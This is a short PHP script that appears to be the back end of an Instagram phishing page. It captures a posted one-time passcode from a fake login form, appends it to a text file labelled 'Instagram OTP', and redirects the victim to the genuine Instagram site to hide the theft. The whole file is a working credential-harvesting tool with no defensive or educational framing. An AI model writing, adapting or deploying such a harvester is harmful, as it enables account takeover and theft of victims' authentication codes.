<?php
file_put_contents("otp.txt", "Instagram OTP : " . $email = $_POST['username'] . "\n", FILE_APPEND);
header('Location: https://instagram.com');
?>
